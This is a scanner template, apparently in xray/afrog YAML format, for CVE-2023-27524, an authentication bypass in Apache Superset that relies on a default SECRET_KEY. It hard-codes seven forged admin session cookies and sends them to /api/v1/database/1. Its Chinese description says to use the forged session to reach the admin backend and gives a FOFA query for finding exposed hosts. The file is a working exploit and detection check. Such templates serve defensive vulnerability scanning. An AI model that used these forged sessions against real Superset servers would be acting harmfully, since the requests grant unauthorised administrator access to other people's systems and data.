id: CVE-2023-27524

info:
    name: Apache Superset身份验证绕过
    author: li1u (https://huclilu.github.io/)
    severity: critical
    verified: true
    description: |
       Apache Superset会话验证漏洞，是由于未根据安装说明更改默认配置的SECRET_KEY，允许攻击者验证和访问未经授权的资源。Superset登陆成功页面跳转到/superset/welcome/，抓包更改session值即可成功绕过身份验证进入后台。
       若失败则提示："Missing Authorization Header"，若响应包为："Not found"，不代表失败，直接携带session值访问/superset/welcome/即可成功进入后台；
       FaFo:title=="Superset"。
    reference:
       - https://www.cve.org/CVERecord?id=CVE-2023-27524
    created: 2023/05/26
    
set:
   hostname: request.url.host
   session1: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZG86UQ.L6gM8Ph6HpLB3mcULDG6ktoW5PE
   session2: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.hKV8XXVcD6lWhTIoWs0CjrSRPQQ
   session3: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.RoFeMf1WLNJXDYslf18x9VGxC0Q
   session4: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.xtJXBhmJ0k6_oKs8iGhWJK2BjKs
   session5: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.hRZP41FgqxjaxjJ3WyeIVxyZDng
   session6: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.6GpaUB9IP9OnG3HHon3XcdzHWhI
   session7: eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZG9odg.nIfuJkn0Vl-8pt7kBzXnJ57wbpM
         
rules:
  r0:
    request:
      method: GET
      path: /api/v1/database/1
      Host: {{hostname}}
      headers:
            Cookie: session={{session1}}
            Content-Type: application/json
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36         
    expression: response.status == 200 && response.body.bcontains(b'"id":1') || response.body.bcontains(b'"message":"Not found"')
  r1:
    request:
      method: GET
      path: /api/v1/database/1
      Host: {{hostname}}
      headers:
            Cookie: session={{session2}}
            Content-Type: application/json
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36         
    expression: response.status == 200 && response.body.bcontains(b'"id":1') || response.body.bcontains(b'"message":"Not found"')
  r2:
    request:
      method: GET
      path: /api/v1/database/1
      Host: {{hostname}}
      headers:
            Cookie: session={{session3}}
            Content-Type: application/json
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36         
    expression: response.status == 200 && response.body.bcontains(b'"id":1') || response.body.bcontains(b'"message":"Not found"')
  r3:
    request:
      method: GET
      path: /api/v1/database/1
      Host: {{hostname}}
      headers:
            Cookie: session={{session4}}
            Content-Type: application/json
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36         
    expression: response.status == 200 && response.body.bcontains(b'"id":1') || response.body.bcontains(b'"message":"Not found"')
  r4:
    request:
      method: GET
      path: /api/v1/database/1
      Host: {{hostname}}
      headers:
            Cookie: session={{session5}}
            Content-Type: application/json
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36         
    expression: response.status == 200 && response.body.bcontains(b'"id":1') || response.body.bcontains(b'"message":"Not found"')
  r5:
    request:
      method: GET
      path: /api/v1/database/1
      Host: {{hostname}}
      headers:
            Cookie: session={{session6}}
            Content-Type: application/json
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36         
    expression: response.status == 200 && response.body.bcontains(b'"id":1') || response.body.bcontains(b'"message":"Not found"')
  r6:
    request:
      method: GET
      path: /api/v1/database/1
      Host: {{hostname}}
      headers:
            Cookie: session={{session7}}
            Content-Type: application/json
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36         
    expression: response.status == 200 && response.body.bcontains(b'"id":1') || response.body.bcontains(b'"message":"Not found"')
expression: r0() || r1() || r2() || r3() || r4() || r5() || r6()